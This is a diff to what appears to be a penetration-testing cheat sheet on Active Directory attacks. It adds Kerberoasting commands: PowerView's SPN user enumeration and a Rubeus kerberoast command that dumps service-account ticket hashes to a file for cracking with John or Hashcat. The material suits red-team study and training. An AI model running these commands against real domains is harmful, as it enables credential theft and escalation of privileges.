@@ -324,6 +324,11 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 ### Kerberoasting
 Find services running with user accounts 
 ```powershell
+#Powerview 
+Get-DomainUser -SPN
+#Rubeus 
+Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+Crack with John/Hashcat/profit
 ```
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
